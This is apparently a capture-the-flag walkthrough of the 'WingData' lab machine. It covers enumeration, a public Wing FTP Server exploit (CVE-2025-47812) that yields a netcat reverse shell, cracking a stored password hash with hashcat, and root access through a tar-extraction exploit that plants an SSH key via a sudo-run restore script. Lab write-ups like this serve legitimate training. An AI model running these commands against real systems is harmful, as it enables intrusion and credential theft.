# WingData
## Enumeration
### Nmap
Nmap results:
```bash
Host is up (0.046s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.66
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Let's add `wingdata.htb` to our `/etc/hosts` and view the website.
<br>
The website is some type of file sharing platform. On `wingdata.htb` we see a link to a login page at `ftp.wingdata.htb` so let's add it to our `hosts` file. And view the login page.
## Exploitation
The first thing we see is `FTP server software powered by Wing FTP Server v7.4.3`.  
Searching for `wing ftp 7.4.3 exploit github poc` leads us to [CVE-2025-47812](https://github.com/0xcan1337/CVE-2025-47812-poC).
<br>
Let's download the PoC and exploit the vulnerability.  
I modified the script a bit, so I don't have to type in the url and username each time i try the exploit, I suggest you do the same.  
First let's set up a listener: `nc -lvnp 4444`
```bash
python3 CVE-2025-47812.py
[*] Payload sent, waiting for reverse shell...
[*] Trying payload: nc <IP> <PORT> -e /bin/sh
[*] Trying to get UID... Payload: nc <IP> <PORT> -e /bin/sh
[+] UID obtained: 5f79b7754ee41940cc5d2e5c5c09eb17f528764d624db129b32c21fbca0cb8d6
[*] Sending /dir.html request...
```
After a couple of payloads we get a reverse shell.
```bash
nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.4.77 52008
python3 -c 'import pty; pty.spawn("/bin/bash")'
wingftp@wingdata:/opt/wftpserver$
```
I strongly suggest to stabilize the shell, before going forward, as the box seems to be buggy and often loses connection (at least on the release day)
## User
Let's check what users are on the machine
```bash
wingftp@wingdata:/opt/wftpserver$ ls /home
ls /home
wacky
```
User: `wacky`  
After looking around the box, I found a couple of hashes in `/opt/wftpserver/Data/1/users`.  
`wacky` hash: `32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca`  
Let's try to crack the hash:
```bash
echo '32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP' > hash.txt
hashcat -m 1410 hash.txt rockyou.txt
```
I got a hit almost immediately: `wacky:!#7Blushing^*Bride5`.  
Turns out these are the credentials for ssh user wacky and the ftp login page.  
```bash
ssh wacky@wingdata.htb
wacky@wingdata:~$ cat user.txt
```
We got user flag!
## Root
First let's run `sudo -l`
```bash
User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```
We can run python and `restore_backup_clients.py` scripts as sudo, let's check out the script.  
```bash
cat /opt/backup_clients/restore_backup_clients.py
```
The script is used to restore `.tar` backups.  
Let's check python version
```bash
wacky@wingdata:~$ python3 --version
Python 3.12.3
```
Searching goole for `python 3.12.3 tar exploit` leads us to [this](https://github.com/google/security-research/security/advisories/GHSA-hgqp-3mmf-7h8f)
## Getting Root
After a lot of trial and error with the script I mentioned earlier, I couldn't get it to work, so I dug deeper and found [this](https://github.com/DesertDemons/CVE-2025-4138-4517-POC). Let's download the exploit to the target machine.
```bash
wacky@wingdata:/tmp$ ls
exploit.py
systemd-private-9381c54a528c4b7bbda687b786cbf42f-apache2.service-5CFzZv
systemd-private-9381c54a528c4b7bbda687b786cbf42f-systemd-logind.service-E8fgQl
systemd-private-9381c54a528c4b7bbda687b786cbf42f-systemd-timesyncd.service-Pgjio9
vmware-root
vmware-root_3371-4282365461
wacky@wingdata:/tmp$ 
```
Now let's execute the needed steps
```bash
wacky@wingdata:/tmp$ ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519 -N ""
wacky@wingdata:/tmp$ python3 exploit.py --preset ssh-key --payload ~/.ssh/id_ed25519.pub --tar-out ./backup_1337.tar
wacky@wingdata:/tmp$ mv backup_1337.tar /opt/backup_clients/backups/
wacky@wingdata:/tmp$ sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_1337.tar -r restore_stigs
wacky@wingdata:/tmp$ ssh -i ~/.ssh/id_ed25519 root@localhost
root@wingdata:~#
```
We got root!
